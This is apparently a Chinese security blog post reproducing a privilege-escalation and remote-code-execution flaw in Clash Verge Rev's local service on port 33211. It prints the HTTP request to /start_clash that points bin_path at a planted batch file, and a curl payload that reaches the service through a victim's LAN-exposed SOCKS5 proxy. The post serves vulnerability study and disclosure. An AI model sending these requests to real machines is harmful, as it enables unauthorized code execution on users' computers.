#  Clash Verge rev提权与命令执行分析   
原创 zkaq - cs  掌控安全EDU   2025-05-09 04:01  
  
扫码领资料  
  
获网安教程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 -  c's 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（ https://bbs.zkaq.cn）**  
# 一、基本信息  
### 1.1、漏洞背景  
  
**复现时间：**  
20250429  
  
**背景：**  
  
https://github.com/clash-verge-rev/clash-verge-rev/issues/3428  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNyUgqMfbAL8PicfxiclaE8wdKicibjlic3w3rF7MaviajmMyr3WAicic5d35polQ/640?wx_fmt=png&from=appmsg "")  
  
1.2、clash生态  
  
1. Clash内核●Clash是一个开源、跨平台的规则分流代理内核，用Go语言开发，核心功能是多协议代理（如VMess、VLESS、Trojan、Shadowsocks、Socks5、HTTP等）+强大的规则分流。  
●本质：命令行程序，无GUI，负责流量抓取、转发、分流、协议转换等。●配置：通过YAML文件配置，支持多节点、多规则、多策略组。●功能：分流、UDP/IPv6支持、透明代理、DNS伪装、测速、订阅等。2. Clash GUI生态●Clash for Windows、ClashX（Mac）、Clash Verge/Verge Rev、Meta、Meta for Android等，都是基于Clash内核的图形界面前端，用来简化配置、管理和可视化操作。1.3、Clash Verge Rev是什么1. Clash Verge Rev简介●Clash Verge Rev是一款基于Clash内核的跨平台GUI客户端。●Verge Rev=Verge的分支/二开版本，通常会有更多新特性、优化和自定义功能。●支持Windows、MacOS、Linux等，界面现代、交互友好。2. 架构●前端（GUI）：负责用户交互、配置管理、节点展示、规则编辑、流量统计等。●后端（内核）：集成Clash核心程序，负责实际的流量抓取、协议解析与分流。●通信：前端通过API/本地端口与Clash内核通信（如RESTful API、WebSocket）。1.4、clash Verge Rev的安全性与架构●GUI和内核分离：理论上GUI和内核可以独立升级，安全性更好。●开源可审计：代码开源，安全人员可自行审计有无后门。●GUI前端：用户操作界面●clash-verge-service：本地服务进程，管理内核和提供接口●Clash内核：真正的网络代理引擎1.5、监听端口clash系列都差不多，常见clash的配置文件：clash-verge-service监听端口：小结一下，端口号作用进程7890、7891代理流量端口（HTTP/SOCKS5）clash-core/meta9090内核 API（external-controller）clash-core/meta33211clash-verge-service 的本地API端口clash-verge-service数据流向：二、漏洞1、提权详细请求数据包，查看日志文件，提权成功辅助测试go程序，代码，代码入口，写入配置，  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNy1u1YsJ2sx4e13crbS5PLxyA4UEOOIm9ia83ibqePiauSynmtk96rU3LNQ/640?wx_fmt=png&from=appmsg "")  
这里可以实现任意文件写入，配合多种姿势rce  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNyjUBzQyVzwYdPY8o2AAmtwG2waIiaptEX0DZJQRxiadBHspwldvyZWDbw/640?wx_fmt=png&from=appmsg "")  
针对mac和非mac文件都可以，  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNyLxkPOnV2ibGYUhX9fIiagficGP8LnuL3uiaEszNV2jX8lUvOy2O3hrhWBQ/640?wx_fmt=png&from=appmsg "")  
2、转换系统rce复现，代码已经写得很详细了。由于参数不完全可控，RCE 部分会复杂一些。可以考虑这样处理：先发送一个请求，把要执行的命令写入 bat 文件，再通过第二个请求调用这个文件即可。该思路可以用于win和mac。详细请求数据包，写入成功  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNy2cUxY77DTgvVM8fkzicAaa84eGic0g7jHtxibmh8M1CcW5NBfLBMdHq5g/640?wx_fmt=png&from=appmsg "")  
第二次请求，  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrov6OFlhDG1jCowicDFbLNyM0VliaEZWm4Ac4E3ptCy8OT2adYr1a90iaSB88bfXS4ju3GGtHThibuyw/640?wx_fmt=png&from=appmsg "")  
详细请求数据包POST /start_clash HTTP/1.1Host: 127.0.0.1:33211Content-Type: application/json{"bin_path": "d:/clash.bat","config_dir": ".","config_file": ".","log_file": "d:/clash.log"}3、进一步利用这个漏洞的影响范围可以更广。特别是当用户在与攻击者相同的局域网环境中开启了局域网功能时，攻击者可以利用clash的代理机制发起直接攻击。payload：```
curl -x socks5://192.168.xx.xx:xx -X POST "http://127.0.0.1:33211/start_clash" \
-H "Content-Type: application/json" \
-d '{
  "bin_path": "xx",
  "config_dir": "xx",
  "config_file": "xx",
  "log_file": "xx"
}'
```  
进一步扩大危害的可能？简单来说，这个漏洞可以集成到蜜罐中，当“攻击者”用受影响的clash访问蜜罐时，蜜罐可以自动发起前述两个请求，实现对攻击者的反制。但是经测试未成功，原因是发起JSON格式的POST请求需要CORS支持，这个方案目前行不通。  
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，  
  
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**没看够~？欢迎关注！**  
  
  
  
**分享本文到朋友圈，可以凭截图找老师领取**  
  
上千**教程+工具+交流群+靶场账号**  
哦  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
******分享后扫码加我！**  
  
  
**回顾往期内容**  
  
[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)  
  
  
[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  
  
  
[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  
  
  
[记某地级市护网的攻防演练行动](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247543747&idx=1&sn=c7745ecb8b33401ae317c295bed41cc8&token=74838194&lang=zh_CN&scene=21#wechat_redirect)  
  
  
  
[手把手教你CNVD漏洞挖掘 + 资产收集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&token=74838194&lang=zh_CN&scene=21#wechat_redirect)  
  
  
[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)  
  
##     代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
点赞+在看支持一下吧~感谢看官老爷~   
  
你的点赞是我更新的动力  
  
